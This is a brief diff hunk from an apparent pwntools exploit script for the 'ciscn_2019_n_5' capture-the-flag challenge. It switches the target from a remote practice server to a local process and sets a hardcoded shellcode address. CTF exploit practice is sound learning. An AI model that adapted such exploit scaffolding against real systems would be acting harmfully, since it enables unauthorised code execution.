@@ -5,7 +5,7 @@ def ciscn_2019_n_5(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/ciscn_2019_n_5')
     print('ciscn_2019_n_5 start')
     context(log_level='info', arch='amd64', os='linux')
     target = process([file_name])
-    target = remote('node4.buuoj.cn', 29061)
+    # target = remote('node4.buuoj.cn', 29061)
     target_elf = ELF(file_name)
 
     shellcode_addr = p64(0x601000)
